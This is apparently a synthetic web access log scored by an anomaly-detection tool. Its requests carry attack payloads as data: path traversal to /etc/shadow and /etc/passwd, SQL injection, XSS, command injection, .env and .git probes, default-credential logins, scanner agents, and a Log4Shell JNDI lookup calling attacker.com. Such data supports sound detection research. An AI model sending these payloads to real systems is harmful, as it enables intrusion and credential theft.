score_content,score_session,score_fused,score_fused_norm,line
30164.0390625,,30164.0390625,30164.0390625,235.122.205.10 - - [10/Jan/2025:12:00:25 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 404 981 "https://news.ycombinator.com/" "curl/7.68.0"
24.409757614135742,,24.409757614135742,24.409757614135742,238.191.15.214 - - [10/Jan/2025:12:00:26 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 13664 "https://twitter.com/" "python-requests/2.31.0"
2.10103702545166,,2.10103702545166,2.10103702545166,205.235.228.204 - - [10/Jan/2025:12:00:31 +0100] "GET /admin HTTP/1.1" 200 10969 "-" "sqlmap/1.5.10#stable"
2.1053504943847656,,2.1053504943847656,2.1053504943847656,161.137.216.43 - - [10/Jan/2025:12:00:32 +0100] "GET /admin HTTP/1.1" 200 12395 "https://www.google.com/" "dirb/2.22"
27.276416778564453,,27.276416778564453,27.276416778564453,182.9.70.106 - - [10/Jan/2025:12:00:36 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 302 10405 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.39971923828125,,24.39971923828125,24.39971923828125,45.29.96.201 - - [10/Jan/2025:12:00:37 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 10006 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
5.032149314880371,,5.032149314880371,5.032149314880371,40.49.88.237 - - [10/Jan/2025:12:00:37 +0100] "GET /admin HTTP/1.1" 304 16485 "https://twitter.com/" "nikto/2.5.0"
3.1105239391326904,,3.1105239391326904,3.1105239391326904,211.252.241.133 - - [10/Jan/2025:12:00:39 +0100] "GET /assets/app.css HTTP/1.1" 304 3319 "https://www.google.com/" "sqlmap/1.5.10#stable"
24.36963653564453,,24.36963653564453,24.36963653564453,30.2.80.239 - - [10/Jan/2025:12:00:40 +0100] "GET /search?q=camera HTTP/1.1" 200 17216 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2676626443862915,,0.2676626443862915,0.2676626443862915,6.148.195.80 - - [10/Jan/2025:12:00:40 +0100] "GET /wp-login.php HTTP/1.1" 200 10339 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.55524253845215,,24.55524253845215,24.55524253845215,172.31.70.39 - - [10/Jan/2025:12:00:41 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 14554 "https://example.com/" "curl/7.68.0"
0.29930466413497925,,0.29930466413497925,0.29930466413497925,141.82.70.37 - - [10/Jan/2025:12:00:41 +0100] "GET /.git/config HTTP/1.1" 200 11579 "https://twitter.com/" "python-requests/2.31.0"
24.401395797729492,,24.401395797729492,24.401395797729492,139.114.13.34 - - [10/Jan/2025:12:00:42 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 201 11199 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.5483947396278381,,0.5483947396278381,0.5483947396278381,101.46.181.153 - - [10/Jan/2025:12:00:47 +0100] "GET /.env HTTP/1.1" 200 14074 "https://twitter.com/" "nikto/2.5.0"
27.104093551635742,,27.104093551635742,27.104093551635742,21.250.237.194 - - [10/Jan/2025:12:00:49 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 302 17581 "https://twitter.com/" "nikto/2.5.0"
0.17302535474300385,,0.17302535474300385,0.17302535474300385,176.165.182.197 - - [10/Jan/2025:12:00:50 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 10270 "https://news.ycombinator.com/" "nikto/2.5.0"
30139.73828125,,30139.73828125,30139.73828125,67.234.94.101 - - [10/Jan/2025:12:00:51 +0100] "GET /assets/app.css HTTP/1.1" 401 1263 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.07816481590271,,2.07816481590271,2.07816481590271,90.123.119.217 - - [10/Jan/2025:12:00:53 +0100] "GET /admin HTTP/1.1" 200 3799 "https://example.com/" "curl/7.68.0"
0.18243199586868286,,0.18243199586868286,0.18243199586868286,210.183.204.28 - - [10/Jan/2025:12:00:55 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13393 "https://twitter.com/" "sqlmap/1.5.10#stable"
24.40949821472168,,24.40949821472168,24.40949821472168,152.106.62.159 - - [10/Jan/2025:12:01:00 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 13233 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.338878631591797,,24.338878631591797,24.338878631591797,209.178.152.111 - - [10/Jan/2025:12:01:01 +0100] "GET /search?q=laptop HTTP/1.1" 200 6923 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
24.198148727416992,,24.198148727416992,24.198148727416992,190.239.183.147 - - [10/Jan/2025:12:01:03 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 2652 "-" "nikto/2.5.0"
24.412633895874023,,24.412633895874023,24.412633895874023,46.79.245.104 - - [10/Jan/2025:12:01:07 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 14688 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
0.5149115920066833,,0.5149115920066833,0.5149115920066833,24.56.210.36 - - [10/Jan/2025:12:01:07 +0100] "GET /.env HTTP/1.1" 200 2114 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.424938201904297,,24.424938201904297,24.424938201904297,115.51.53.175 - - [10/Jan/2025:12:01:12 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 19037 "https://example.com/" "sqlmap/1.5.10#stable"
30141.701171875,,30141.701171875,30141.701171875,184.252.235.89 - - [10/Jan/2025:12:01:16 +0100] "GET /logout HTTP/1.1" 404 890 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30140.07421875,,30140.07421875,30140.07421875,16.95.231.141 - - [10/Jan/2025:12:01:16 +0100] "GET /.env HTTP/1.1" 401 602 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.320415496826172,,24.320415496826172,24.320415496826172,222.8.61.111 - - [10/Jan/2025:12:01:21 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 9347 "https://example.com/" "dirb/2.22"
0.5264257788658142,,0.5264257788658142,0.5264257788658142,170.45.122.36 - - [10/Jan/2025:12:01:26 +0100] "GET /.env HTTP/1.1" 200 7021 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
30141.537109375,,30141.537109375,30141.537109375,74.224.172.33 - - [10/Jan/2025:12:01:29 +0100] "GET /profile HTTP/1.1" 400 315 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.065218210220337,,3.065218210220337,3.065218210220337,169.112.250.254 - - [10/Jan/2025:12:01:29 +0100] "GET /../../etc/passwd HTTP/1.1" 302 16048 "-" "curl/7.68.0"
30141.3515625,,30141.3515625,30141.3515625,155.239.109.160 - - [10/Jan/2025:12:01:30 +0100] "GET /server-status HTTP/1.1" 401 1424 "https://news.ycombinator.com/" "curl/7.68.0"
0.16399437189102173,,0.16399437189102173,0.16399437189102173,48.109.155.2 - - [10/Jan/2025:12:01:34 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 7497 "https://www.google.com/" "nikto/2.5.0"
30141.48046875,,30141.48046875,30141.48046875,94.9.251.10 - - [10/Jan/2025:12:01:39 +0100] "GET /server-status HTTP/1.1" 404 1180 "https://example.com/" "nikto/2.5.0"
1.9462982416152954,,1.9462982416152954,1.9462982416152954,252.220.252.193 - - [10/Jan/2025:12:01:39 +0100] "GET /phpmyadmin HTTP/1.1" 200 17349 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.9036258459091187,,1.9036258459091187,1.9036258459091187,176.163.139.205 - - [10/Jan/2025:12:01:43 +0100] "GET /phpmyadmin HTTP/1.1" 200 2658 "https://twitter.com/" "python-requests/2.31.0"
2.3326163291931152,,2.3326163291931152,2.3326163291931152,232.121.147.188 - - [10/Jan/2025:12:01:43 +0100] "GET / HTTP/1.1" 200 16898 "https://news.ycombinator.com/" "curl/7.68.0"
2.0441954135894775,,2.0441954135894775,2.0441954135894775,178.237.153.192 - - [10/Jan/2025:12:01:45 +0100] "GET /logout HTTP/1.1" 200 1257 "https://twitter.com/" "curl/7.68.0"
24.600975036621094,,24.600975036621094,24.600975036621094,14.169.254.75 - - [10/Jan/2025:12:01:47 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 18871 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30141.45703125,,30141.45703125,30141.45703125,65.34.158.72 - - [10/Jan/2025:12:01:50 +0100] "GET /phpmyadmin HTTP/1.1" 401 569 "https://example.com/" "python-requests/2.31.0"
30139.9296875,,30139.9296875,30139.9296875,169.115.95.207 - - [10/Jan/2025:12:01:50 +0100] "GET /assets/app.js HTTP/1.1" 404 309 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.981525421142578,,2.981525421142578,2.981525421142578,88.252.22.248 - - [10/Jan/2025:12:01:55 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 304 1184 "https://twitter.com/" "curl/7.68.0"
27.28028106689453,,27.28028106689453,27.28028106689453,170.113.186.164 - - [10/Jan/2025:12:01:56 +0100] "GET /search?q=phone HTTP/1.1" 304 7897 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.0198843479156494,,2.0198843479156494,2.0198843479156494,194.210.30.14 - - [10/Jan/2025:12:02:00 +0100] "GET /profile HTTP/1.1" 200 8763 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
27.473100662231445,,27.473100662231445,27.473100662231445,60.98.175.181 - - [10/Jan/2025:12:02:03 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 302 17549 "https://news.ycombinator.com/" "dirb/2.22"
1.856099247932434,,1.856099247932434,1.856099247932434,98.174.81.247 - - [10/Jan/2025:12:02:05 +0100] "GET /server-status HTTP/1.1" 200 14806 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8387494087219238,,1.8387494087219238,1.8387494087219238,86.70.69.206 - - [10/Jan/2025:12:02:09 +0100] "GET /server-status HTTP/1.1" 200 9032 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
3.08113169670105,,3.08113169670105,3.08113169670105,188.173.151.198 - - [10/Jan/2025:12:02:14 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 304 8023 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
0.09450715035200119,,0.09450715035200119,0.09450715035200119,173.3.213.18 - - [10/Jan/2025:12:02:16 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 446 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.17019817233085632,,0.17019817233085632,0.17019817233085632,65.50.9.7 - - [10/Jan/2025:12:02:16 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 9383 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30164.95703125,,30164.95703125,30164.95703125,32.182.246.31 - - [10/Jan/2025:12:02:20 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 429 1306 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30139.685546875,,30139.685546875,30139.685546875,48.65.76.120 - - [10/Jan/2025:12:02:21 +0100] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 403 1424 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9347831010818481,,1.9347831010818481,1.9347831010818481,71.199.16.98 - - [10/Jan/2025:12:02:23 +0100] "GET /dashboard HTTP/1.1" 200 2524 "https://example.com/" "Wget/1.20.3 (linux-gnu)"
24.520069122314453,,24.520069122314453,24.520069122314453,126.251.238.52 - - [10/Jan/2025:12:02:23 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 2374 "https://www.google.com/" "dirb/2.22"
0.18481197953224182,,0.18481197953224182,0.18481197953224182,56.158.165.28 - - [10/Jan/2025:12:02:28 +0100] "GET /../../etc/passwd HTTP/1.1" 200 14231 "https://example.com/" "nikto/2.5.0"
1.9198211431503296,,1.9198211431503296,1.9198211431503296,199.115.5.230 - - [10/Jan/2025:12:02:28 +0100] "GET /phpmyadmin HTTP/1.1" 200 8311 "https://www.google.com/" "nikto/2.5.0"
3.11861515045166,,3.11861515045166,3.11861515045166,39.180.85.232 - - [10/Jan/2025:12:02:33 +0100] "GET /wp-login.php HTTP/1.1" 301 8830 "https://twitter.com/" "dirb/2.22"
24.58623695373535,,24.58623695373535,24.58623695373535,217.187.200.208 - - [10/Jan/2025:12:02:33 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 13335 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.59789276123047,,24.59789276123047,24.59789276123047,240.254.92.86 - - [10/Jan/2025:12:02:34 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 17640 "https://news.ycombinator.com/" "python-requests/2.31.0"
1.9291707277297974,,1.9291707277297974,1.9291707277297974,21.216.118.195 - - [10/Jan/2025:12:02:34 +0100] "GET /phpmyadmin HTTP/1.1" 200 11243 "https://www.google.com/" "python-requests/2.31.0"
0.5289636850357056,,0.5289636850357056,0.5289636850357056,179.100.230.28 - - [10/Jan/2025:12:02:35 +0100] "GET /.env HTTP/1.1" 204 9893 "https://news.ycombinator.com/" "sqlmap/1.5.10#stable"
27.20703125,,27.20703125,27.20703125,10.50.7.185 - - [10/Jan/2025:12:02:35 +0100] "GET /search?q=camera HTTP/1.1" 302 4685 "https://www.google.com/" "python-requests/2.31.0"
24.413982391357422,,24.413982391357422,24.413982391357422,248.5.10.87 - - [10/Jan/2025:12:02:38 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 14822 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3151301145553589,,0.3151301145553589,0.3151301145553589,118.241.174.223 - - [10/Jan/2025:12:02:43 +0100] "GET /.git/config HTTP/1.1" 200 17241 "https://twitter.com/" "curl/7.68.0"
3.217135429382324,,3.217135429382324,3.217135429382324,168.5.121.233 - - [10/Jan/2025:12:02:44 +0100] "GET /index.html HTTP/1.1" 302 16120 "-" "python-requests/2.31.0"
0.19603024423122406,,0.19603024423122406,0.19603024423122406,232.79.211.204 - - [10/Jan/2025:12:02:45 +0100] "GET /assets/app.css HTTP/1.1" 200 1737 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30141.4609375,,30141.4609375,30141.4609375,30.128.153.205 - - [10/Jan/2025:12:02:49 +0100] "GET /phpmyadmin HTTP/1.1" 400 217 "-" "Wget/1.20.3 (linux-gnu)"
0.5612767934799194,,0.5612767934799194,0.5612767934799194,140.36.83.215 - - [10/Jan/2025:12:02:50 +0100] "GET /.env HTTP/1.1" 200 18973 "-" "Wget/1.20.3 (linux-gnu)"
1.9080382585525513,,1.9080382585525513,1.9080382585525513,194.107.44.179 - - [10/Jan/2025:12:02:54 +0100] "GET /phpmyadmin HTTP/1.1" 200 4728 "https://twitter.com/" "sqlmap/1.5.10#stable"
0.27402833104133606,,0.27402833104133606,0.27402833104133606,200.41.5.226 - - [10/Jan/2025:12:02:55 +0100] "GET /wp-login.php HTTP/1.1" 200 12425 "-" "nikto/2.5.0"
4.827234745025635,,4.827234745025635,4.827234745025635,228.73.107.178 - - [10/Jan/2025:12:02:55 +0100] "GET /phpmyadmin HTTP/1.1" 302 19555 "https://www.google.com/" "nikto/2.5.0"
24.55255699157715,,24.55255699157715,24.55255699157715,62.241.45.157 - - [10/Jan/2025:12:02:56 +0100] "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 13601 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
2.0958592891693115,,2.0958592891693115,2.0958592891693115,90.108.2.143 - - [10/Jan/2025:12:02:57 +0100] "GET /about HTTP/1.1" 201 9969 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.043942928314209,,2.043942928314209,2.043942928314209,130.57.119.198 - - [10/Jan/2025:12:02:57 +0100] "GET /contact HTTP/1.1" 201 17785 "https://www.google.com/" "sqlmap/1.5.10#stable"
3.2263147830963135,,3.2263147830963135,3.2263147830963135,128.46.41.172 - - [10/Jan/2025:12:02:59 +0100] "GET /.git/config HTTP/1.1" 304 15645 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.210350036621094,,24.210350036621094,24.210350036621094,158.207.228.195 - - [10/Jan/2025:12:03:04 +0100] "GET /login?user=admin&pass=admin HTTP/1.1" 200 11054 "-" "nikto/2.5.0"
0.2278457134962082,,0.2278457134962082,0.2278457134962082,125.132.30.19 - - [10/Jan/2025:12:03:04 +0100] "GET /assets/app.js HTTP/1.1" 200 1052 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8442833423614502,,1.8442833423614502,1.8442833423614502,59.200.29.84 - - [10/Jan/2025:12:03:08 +0100] "GET /server-status HTTP/1.1" 200 10772 "-" "Wget/1.20.3 (linux-gnu)"
1.968171238899231,,1.968171238899231,1.968171238899231,19.121.150.125 - - [10/Jan/2025:12:03:09 +0100] "GET /api/products HTTP/1.1" 200 7330 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.1793503612279892,,0.1793503612279892,0.1793503612279892,35.118.185.50 - - [10/Jan/2025:12:03:10 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 12338 "https://example.com/" "sqlmap/1.5.10#stable"
3.10123348236084,,3.10123348236084,3.10123348236084,72.35.29.219 - - [10/Jan/2025:12:03:11 +0100] "GET /wp-login.php HTTP/1.1" 301 2054 "https://news.ycombinator.com/" "nikto/2.5.0"
24.397991180419922,,24.397991180419922,24.397991180419922,155.41.203.204 - - [10/Jan/2025:12:03:14 +0100] "GET /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 9771 "https://twitter.com/" "curl/7.68.0"
2.1186163425445557,,2.1186163425445557,2.1186163425445557,126.221.56.152 - - [10/Jan/2025:12:03:18 +0100] "GET /about HTTP/1.1" 200 17197 "https://news.ycombinator.com/" "Wget/1.20.3 (linux-gnu)"
4.711402416229248,,4.711402416229248,4.711402416229248,64.84.112.149 - - [10/Jan/2025:12:03:20 +0100] "GET /server-status HTTP/1.1" 302 8182 "https://twitter.com/" "Wget/1.20.3 (linux-gnu)"
2.293959856033325,,2.293959856033325,2.293959856033325,11.254.121.188 - - [10/Jan/2025:12:03:21 +0100] "GET / HTTP/1.1" 200 1549 "-" "python-requests/2.31.0"
27.47063636779785,,27.47063636779785,27.47063636779785,116.127.62.22 - - [10/Jan/2025:12:03:24 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 304 3311 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.37841796875,,24.37841796875,24.37841796875,5.123.172.79 - - [10/Jan/2025:12:03:25 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 3073 "https://news.ycombinator.com/" "curl/7.68.0"
11031.7353515625,,11031.7353515625,11031.7353515625,198.36.224.181 - - [10/Jan/2025:12:03:29 +0100] "GET / HTTP/1.1" 500 949 "https://www.google.com/" "Wget/1.20.3 (linux-gnu)"
30141.6953125,,30141.6953125,30141.6953125,99.229.177.86 - - [10/Jan/2025:12:03:31 +0100] "GET /admin HTTP/1.1" 401 144 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.870672225952148,,4.870672225952148,4.870672225952148,159.226.86.189 - - [10/Jan/2025:12:03:34 +0100] "GET /api/products HTTP/1.1" 304 2752 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2729991376399994,,0.2729991376399994,0.2729991376399994,120.159.11.94 - - [10/Jan/2025:12:03:39 +0100] "GET /wp-login.php HTTP/1.1" 200 12079 "https://www.google.com/" "sqlmap/1.5.10#stable"
1.9148101806640625,,1.9148101806640625,1.9148101806640625,36.252.86.62 - - [10/Jan/2025:12:03:44 +0100] "GET /phpmyadmin HTTP/1.1" 200 6808 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
4.844137191772461,,4.844137191772461,4.844137191772461,83.91.230.69 - - [10/Jan/2025:12:03:49 +0100] "GET /api/products HTTP/1.1" 302 7487 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.340068817138672,,24.340068817138672,24.340068817138672,129.135.213.32 - - [10/Jan/2025:12:03:51 +0100] "GET /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 16032 "https://twitter.com/" "nikto/2.5.0"
2.066754102706909,,2.066754102706909,2.066754102706909,205.173.243.178 - - [10/Jan/2025:12:03:56 +0100] "GET /logout HTTP/1.1" 200 12163 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30140.15625,,30140.15625,30140.15625,246.245.20.28 - - [10/Jan/2025:12:03:59 +0100] "GET /.env HTTP/1.1" 403 590 "https://example.com/" "curl/7.68.0"
24.565610885620117,,24.565610885620117,24.565610885620117,134.244.161.6 - - [10/Jan/2025:12:03:59 +0100] "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.com%2Fa%7D HTTP/1.1" 200 6793 "https://news.ycombinator.com/" "python-requests/2.31.0"
0.18378256261348724,,0.18378256261348724,0.18378256261348724,114.189.166.6 - - [10/Jan/2025:12:04:04 +0100] "GET /../../etc/passwd HTTP/1.1" 200 13866 "https://www.google.com/" "python-requests/2.31.0"
30163.69921875,,30163.69921875,30163.69921875,166.86.106.149 - - [10/Jan/2025:12:04:04 +0100] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 400 1064 "https://example.com/" "sqlmap/1.5.10#stable"
0.1965475082397461,,0.1965475082397461,0.1965475082397461,34.230.203.79 - - [10/Jan/2025:12:04:07 +0100] "GET /cgi-bin/test.cgi HTTP/1.1" 200 18687 "https://example.com/" "curl/7.68.0"
27.29558563232422,,27.29558563232422,27.29558563232422,38.91.73.117 - - [10/Jan/2025:12:04:08 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 304 1650 "https://twitter.com/" "curl/7.68.0"
